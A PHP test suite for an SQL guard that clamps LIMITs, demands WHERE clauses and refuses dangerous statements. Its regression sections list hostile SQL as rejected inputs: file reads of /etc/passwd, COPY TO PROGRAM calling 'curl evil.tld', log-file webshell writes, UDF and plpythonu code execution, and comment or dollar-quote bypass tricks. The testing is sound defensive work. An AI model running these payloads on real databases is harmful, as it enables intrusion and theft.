<?php

use App\Enums\StatementType;
use App\Services\Sql\InspectionResult;
use App\Services\Sql\SqlInspector;

function inspect(string $sql): InspectionResult
{
    return app(SqlInspector::class)->inspect($sql);
}

test('select without limit gets the default limit injected', function () {
    $result = inspect('SELECT * FROM users');

    expect($result->passes())->toBeTrue()
        ->and($result->statements[0]->preparedSql)->toBe("SELECT * FROM users\nLIMIT 1000")
        ->and($result->statements[0]->limitInjected)->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
});

test('select with a reasonable limit is untouched', function () {
    $result = inspect('SELECT * FROM users LIMIT 50');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 50')
        ->and($result->statements[0]->limitInjected)->toBeFalse()
        ->and($result->statements[0]->limitClamped)->toBeFalse();
});

test('select limit above the hard cap is clamped', function () {
    $result = inspect('SELECT * FROM users LIMIT 20000');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000')
        ->and($result->statements[0]->limitClamped)->toBeTrue();
});

test('mysql offset-comma limit clamps the count only', function () {
    $result = inspect('SELECT * FROM users LIMIT 10, 20000');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10, 10000');
});

test('limit-offset form clamps the count only', function () {
    $result = inspect('SELECT * FROM users LIMIT 99999 OFFSET 4');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000 OFFSET 4');
});

test('subquery limits are ignored when guarding the outer query', function () {
    $result = inspect('SELECT * FROM (SELECT id FROM t LIMIT 5) q');

    expect($result->statements[0]->preparedSql)->toBe("SELECT * FROM (SELECT id FROM t LIMIT 5) q\nLIMIT 1000");
});

test('limit is injected before a locking clause', function () {
    $result = inspect('SELECT * FROM jobs FOR UPDATE');

    expect($result->statements[0]->preparedSql)->toBe("SELECT * FROM jobs\nLIMIT 1000\nFOR UPDATE");
});

test('limit all is clamped to the hard cap', function () {
    $result = inspect('SELECT * FROM users LIMIT ALL');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000');
});

test('update without where is rejected', function () {
    $result = inspect('UPDATE users SET active = 0');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('WHERE');
});

test('delete without where is rejected', function () {
    $result = inspect('DELETE FROM users');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('WHERE');
});

test('update with where passes and is classified as write', function () {
    $result = inspect('UPDATE users SET active = 0 WHERE id = 5');

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->statements[0]->preparedSql)->toBe('UPDATE users SET active = 0 WHERE id = 5');
});

test('multiple statements without a transaction are rejected', function () {
    $result = inspect('UPDATE a SET x=1 WHERE id=1; UPDATE b SET y=2 WHERE id=2');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('explicit transaction');
});

test('an explicit transaction with multiple writes passes', function () {
    $result = inspect("BEGIN;\nUPDATE a SET x=1 WHERE id=1;\nINSERT INTO logs(msg) VALUES ('x');\nCOMMIT;");

    expect($result->passes())->toBeTrue()
        ->and($result->isTransaction)->toBeTrue()
        ->and($result->statements)->toHaveCount(2)
        ->and($result->type())->toBe(StatementType::Write);
});

test('where guard applies inside transactions', function () {
    $result = inspect('BEGIN; DELETE FROM users; COMMIT;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('WHERE');
});

test('begin without commit is rejected', function () {
    $result = inspect('BEGIN; UPDATE a SET x=1 WHERE id=1;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('COMMIT');
});

test('rollback statements are rejected', function () {
    $result = inspect('BEGIN; UPDATE a SET x=1 WHERE id=1; ROLLBACK;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('ROLLBACK');
});

test('forbidden administrative statements are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'DROP DATABASE prod',
    'GRANT ALL ON *.* TO joe',
    'REVOKE SELECT ON db.t FROM joe',
    'CREATE USER hacker IDENTIFIED BY "x"',
    'SET GLOBAL general_log = 1',
]);

test('show and explain are classified as reads without limit injection', function () {
    expect(inspect('SHOW TABLES')->type())->toBe(StatementType::Read)
        ->and(inspect('SHOW TABLES')->statements[0]->preparedSql)->toBe('SHOW TABLES')
        ->and(inspect('EXPLAIN SELECT * FROM t')->type())->toBe(StatementType::Read);
});

test('a cte wrapping a write is classified as write', function () {
    $result = inspect('WITH doomed AS (SELECT id FROM t) DELETE FROM t WHERE id IN (SELECT id FROM doomed)');

    expect($result->type())->toBe(StatementType::Write);
});

test('a pure cte select is read and gets a limit', function () {
    $result = inspect('WITH recent AS (SELECT * FROM t) SELECT * FROM recent');

    expect($result->type())->toBe(StatementType::Read)
        ->and($result->statements[0]->preparedSql)->toEndWith('LIMIT 1000');
});

test('unparseable dialect-specific selects still get guarded best-effort', function () {
    $result = inspect("SELECT id::text FROM users WHERE meta @> '{}'");

    expect($result->type())->toBe(StatementType::Read)
        ->and($result->statements[0]->preparedSql)->toEndWith('LIMIT 1000');
});

test('unparseable update without where is still rejected', function () {
    $result = inspect('UPDATE users SET meta = meta || \'{"a":1}\'::jsonb');

    expect($result->passes())->toBeFalse();
});

test('empty and comment-only input is rejected', function () {
    expect(inspect('')->passes())->toBeFalse()
        ->and(inspect('-- just a comment')->passes())->toBeFalse()
        ->and(inspect('/* block */')->passes())->toBeFalse();
});

test('insert is a write and passes without where', function () {
    $result = inspect('INSERT INTO t (a) VALUES (1)');

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write);
});

test('semicolons inside string literals do not split statements', function () {
    $result = inspect("SELECT * FROM t WHERE name = 'a;b'");

    expect($result->passes())->toBeTrue()
        ->and($result->statements)->toHaveCount(1);
});

test('trailing semicolon does not create a phantom statement', function () {
    $result = inspect('SELECT * FROM t;');

    expect($result->statements)->toHaveCount(1)
        ->and($result->passes())->toBeTrue();
});

// --- Regression: guard bypasses found in the 2026-09-07 security scan ---

test('forbidden statements cannot be smuggled past the guard with comments', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'leading block comment' => '/* hi */ DROP DATABASE prod',
    'inline comment between keywords' => 'DROP/**/DATABASE prod',
    'leading line comment' => "-- x\nGRANT ALL ON *.* TO 'x'@'%'",
    'inline comment in SET GLOBAL' => 'SET/**/GLOBAL general_log = 1',
]);

test('file-IO statements are always rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'SELECT INTO OUTFILE' => "SELECT * FROM users INTO OUTFILE '/tmp/x'",
    'SELECT INTO DUMPFILE' => "SELECT * FROM users INTO DUMPFILE '/tmp/x'",
    'LOAD DATA INFILE' => "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
    'COPY TO program' => "COPY t TO PROGRAM 'curl evil.tld'",
    'LOAD_FILE call' => "SELECT LOAD_FILE('/etc/passwd')",
]);

test('a data-modifying CTE is classified as a write, not a read', function () {
    $result = inspect('WITH x AS (INSERT INTO t VALUES (1) RETURNING id) SELECT * FROM x');

    expect($result->type())->toBe(StatementType::Write);
});

test('a trailing line comment cannot swallow the injected limit', function (string $sql) {
    $prepared = inspect($sql)->statements[0]->preparedSql;

    // The injected LIMIT must sit on its own line, outside the comment.
    expect($prepared)->toContain("\nLIMIT 1000")
        ->and($prepared)->toEndWith('LIMIT 1000');
})->with([
    'dash comment' => 'SELECT * FROM users --',
    'hash comment' => 'SELECT * FROM users #',
]);

test('an arithmetic or otherwise unparseable LIMIT is rejected, not left unclamped', function () {
    $result = inspect('SELECT * FROM users LIMIT 100*100000');

    expect($result->passes())->toBeFalse();
});

test('FETCH FIRST n ROWS ONLY above the hard cap is clamped', function () {
    $result = inspect('SELECT * FROM users ORDER BY id FETCH FIRST 9999999 ROWS ONLY');

    expect($result->passes())->toBeTrue()
        ->and($result->statements[0]->preparedSql)->toContain('FETCH FIRST 10000 ROWS ONLY')
        ->and($result->statements[0]->limitClamped)->toBeTrue();
});

// --- Regression: denylist gaps found in the 2026-09-18 security scan ---

test('privilege-escalation and code-execution statements are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'SET @@GLOBAL variable syntax' => "SET @@GLOBAL.general_log_file = '/var/www/s.php'",
    'SET @@global lowercase' => 'SET @@global.general_log = 1',
    'SET @@GLOBAL with loose spacing' => 'SET @@ GLOBAL . general_log = 1',
    'SET @@GLOBAL behind a comment' => 'SET/**/@@GLOBAL.general_log = 1',
    'SET PERSIST' => 'SET PERSIST general_log = 1',
    'SET @@PERSIST variable syntax' => 'SET @@PERSIST.general_log = 1',
    'MySQL UDF via SONAME' => "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'",
    'MySQL aggregate UDF via SONAME' => "CREATE AGGREGATE FUNCTION agg RETURNS INT SONAME 'udf.so'",
    'CREATE EXTENSION' => 'CREATE EXTENSION plpythonu',
    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS plperlu',
    'PostgreSQL anonymous code block' => 'DO LANGUAGE plpythonu $$ import os; os.system("id") $$',
]);

test('postgresql file-IO functions are rejected even inside a read', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'pg_read_file' => "SELECT pg_read_file('/etc/passwd')",
    'schema-qualified pg_read_file' => "SELECT pg_catalog.pg_read_file('/etc/passwd')",
    'pg_read_binary_file' => "SELECT pg_read_binary_file('/etc/passwd')",
    'pg_ls_dir' => "SELECT pg_ls_dir('/')",
    'lo_import' => "SELECT lo_import('/etc/passwd')",
    'lo_export' => "SELECT lo_export(1, '/tmp/x')",
]);

test('legitimate statements are not caught by the widened denylist', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'UPDATE ... SET' => 'UPDATE t SET x = 1 WHERE id = 1',
    'SET NAMES' => 'SET NAMES utf8mb4',
    'SET SESSION' => "SET SESSION time_zone = '+00:00'",
    'SET @@SESSION variable syntax' => "SET @@SESSION.time_zone = '+00:00'",
    'user variable' => 'SET @x = 1',
    'file-IO name inside a string literal' => "SELECT * FROM logs WHERE action = 'pg_read_file'",
    'file-IO name as a column' => 'SELECT pg_read_file AS x FROM t',
    'file-IO name as a table prefix' => 'SELECT * FROM pg_ls_dir_audit',
    'SQL-bodied CREATE FUNCTION' => 'CREATE FUNCTION f() RETURNS int RETURN 1',
]);

test('DROP TABLE and TRUNCATE pass as approval-gated writes flagged as DDL', function (string $sql) {
    $result = inspect($sql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue();
})->with([
    'DROP TABLE old_logs',
    'TRUNCATE TABLE sessions',
]);

// --- Targeted rules: judge the dangerous part, not the syntax (2026-09-18) ---

test('legitimate DBA statements the blanket denylist used to block now pass', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'CREATE EXTENSION' => 'CREATE EXTENSION pg_stat_statements',
    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS pgcrypto',
    'quoted extension name' => 'CREATE EXTENSION "uuid-ossp"',
    'extension WITH SCHEMA and CASCADE' => 'CREATE EXTENSION IF NOT EXISTS postgis WITH SCHEMA public CASCADE',
    'DO block with the implicit plpgsql default' => 'DO $$ BEGIN UPDATE t SET x=1 WHERE id=2; END $$',
    'DO block with a leading LANGUAGE clause' => 'DO LANGUAGE plpgsql $$ BEGIN PERFORM 1; END $$',
    'DO block with a trailing LANGUAGE clause' => 'DO $$ BEGIN PERFORM 1; END $$ LANGUAGE plpgsql',
    'SET GLOBAL' => 'SET GLOBAL max_connections = 500',
    'SET @@GLOBAL variable syntax' => 'SET @@GLOBAL.wait_timeout = 600',
    'SET PERSIST' => 'SET PERSIST max_connections = 500',
    'SET GLOBAL with several harmless variables' => 'SET GLOBAL max_connections = 500, wait_timeout = 600',
    'SET GLOBAL TRANSACTION' => 'SET GLOBAL TRANSACTION ISOLATION LEVEL SERIALIZABLE',
]);

test('untrusted procedural languages are rejected however they are spelled', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'CREATE EXTENSION plpythonu' => 'CREATE EXTENSION plpythonu',
    'CREATE EXTENSION IF NOT EXISTS plperlu' => 'CREATE EXTENSION IF NOT EXISTS plperlu',
    'double-quoted extension name' => 'CREATE EXTENSION "plpythonu"',
    'backtick-quoted extension name' => 'CREATE EXTENSION `pltclu`',
    'single-quoted extension name' => "CREATE EXTENSION 'plperlu'",
    'lowercase keywords, uppercase name' => 'create extension PLPYTHON3U',
    'comments wedged into IF NOT EXISTS' => 'CREATE EXTENSION IF/**/NOT/**/EXISTS plpythonu',
    'untrusted extension WITH SCHEMA' => 'CREATE EXTENSION plsh WITH SCHEMA public',
    'DO with a leading LANGUAGE clause' => 'DO LANGUAGE plpythonu $$ import os $$',
    'DO with a trailing LANGUAGE clause' => 'DO $$ import os $$ LANGUAGE plpythonu',
    'DO with a quoted language name' => 'DO $$ import os $$ LANGUAGE "plperlu"',
    'DO with a custom dollar tag' => 'DO $py$ import os $py$ LANGUAGE plpython3u',
    'DO with a single-quoted body' => "DO 'import os' LANGUAGE plpythonu",
]);

test('persistent writes to file / code / protection variables are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'general_log_file' => "SET @@GLOBAL.general_log_file = '/var/www/x.php'",
    'general_log' => 'SET GLOBAL general_log = 1',
    'secure_file_priv' => "SET PERSIST secure_file_priv = ''",
    'local_infile' => 'SET GLOBAL local_infile = 1',
    'plugin_load_add' => "SET GLOBAL plugin_load_add = 'x'",
    'init_connect' => "SET GLOBAL init_connect = 'x'",
    'slow_query_log_file' => "SET GLOBAL slow_query_log_file = '/tmp/x'",
    'log_error' => "SET PERSIST log_error = '/tmp/x'",
    'backtick-quoted variable name' => 'SET GLOBAL `general_log` = 1',
    'double-quoted variable name' => 'SET GLOBAL "general_log" = 1',
    'the := assignment form' => 'SET GLOBAL general_log:=1',
    'PERSIST_ONLY scope' => 'SET PERSIST_ONLY general_log = 1',
    'hidden behind a harmless first assignment' => 'SET GLOBAL max_connections = 500, general_log = 1',
]);

test('a violation names the extension and the reason it was refused', function () {
    $result = inspect('CREATE EXTENSION plpythonu');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('plpythonu')
        ->and($result->violations[0])->toContain('untrusted procedural language');
});

test('a dollar-quoted body is one statement, not one per semicolon inside it', function () {
    $result = inspect("DO \$fix\$\nBEGIN\n  UPDATE t SET x = 1 WHERE id = 2;\n  UPDATE u SET y = 2 WHERE id = 3;\nEND\n\$fix\$");

    expect($result->passes())->toBeTrue()
        ->and($result->statements)->toHaveCount(1)
        ->and($result->type())->toBe(StatementType::Write);
});

test('dollar quoting cannot hide a following statement from the guard', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'unterminated tag' => 'SELECT 1 $$; DROP DATABASE prod',
    'tag inside a string literal' => "SELECT '\$\$'; DROP DATABASE prod",
    'tag inside a line comment' => "-- \$\$\nDROP DATABASE prod",
    'mismatched open and close tags' => 'DO $a$ x $b$; DROP DATABASE prod',
    'statement appended after a real body' => 'DO $$ BEGIN PERFORM 1; END $$; DROP DATABASE prod',
]);

test('the guard lists are extended by configuration and cannot be shortened by it', function () {
    config([
        'queryproxy.untrusted_languages' => ['plevil'],
        'queryproxy.dangerous_variables' => ['evil_var'],
    ]);

    expect(inspect('CREATE EXTENSION plevil')->passes())->toBeFalse()
        ->and(inspect('DO $$ x $$ LANGUAGE plevil')->passes())->toBeFalse()
        ->and(inspect('SET GLOBAL evil_var = 1')->passes())->toBeFalse()
        // The built-in floor survives a configuration that no longer names it.
        ->and(inspect('CREATE EXTENSION plpythonu')->passes())->toBeFalse()
        ->and(inspect('SET GLOBAL general_log = 1')->passes())->toBeFalse();
});

test('the unconditional denylist cannot be carried through a DO block body', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'DROP DATABASE' => 'DO $$ BEGIN DROP DATABASE prod; END $$',
    'DROP SCHEMA' => 'DO $$ BEGIN DROP SCHEMA public CASCADE; END $$',
    'GRANT' => 'DO $$ BEGIN GRANT ALL ON *.* TO x; END $$',
    'REVOKE' => 'DO $$ BEGIN REVOKE SELECT ON t FROM x; END $$',
    'CREATE USER' => 'DO $$ BEGIN CREATE USER hacker; END $$',
    'pg_read_file' => "DO \$\$ BEGIN PERFORM pg_read_file('/etc/passwd'); END \$\$",
    'lo_export' => "DO \$\$ BEGIN PERFORM lo_export(1, '/tmp/x'); END \$\$",
    'COPY TO PROGRAM' => "DO \$\$ BEGIN COPY t TO PROGRAM 'curl evil.tld'; END \$\$",
    'behind an IF ... THEN' => 'DO $$ BEGIN IF x = 1 THEN DROP DATABASE prod; END IF; END $$',
    'quoted with a nested dollar tag' => 'DO $$ BEGIN EXECUTE $q$GRANT ALL ON *.* TO x$q$; END $$',
    'single-quoted body' => "DO 'BEGIN DROP DATABASE prod; END' LANGUAGE plpgsql",
]);

test('the DO body scan does not reject an ordinary plpgsql block', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'plain update' => 'DO $$ BEGIN UPDATE t SET x=1 WHERE id=2; END $$',
    'plain perform' => 'DO $$ BEGIN PERFORM 1; END $$',
    'a declared name that merely starts with a keyword' => 'DO $$ DECLARE copy_count int; BEGIN SELECT count(*) INTO copy_count FROM t; END $$',
    'a table name that merely starts with a keyword' => 'DO $$ BEGIN INSERT INTO outfile_log (a) VALUES (1); END $$',
    'a forbidden statement as literal data, not as code' => "DO \$\$ BEGIN UPDATE audit SET note = 'DROP DATABASE prod' WHERE id = 1; END \$\$",
]);

test('an untrusted language is caught by the pl...u convention, not only by name', function () {
    // plpython4u is in no list; the naming convention is what refuses it.
    expect(inspect('CREATE EXTENSION plpython4u')->passes())->toBeFalse()
        ->and(inspect('DO $$ x $$ LANGUAGE plpython4u')->passes())->toBeFalse();
});

test('trusted procedural languages are not caught by the convention', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'CREATE EXTENSION plpgsql',
    'CREATE EXTENSION pltcl',
    'CREATE EXTENSION plperl',
    'CREATE EXTENSION plv8',
    'CREATE EXTENSION pllua',
]);
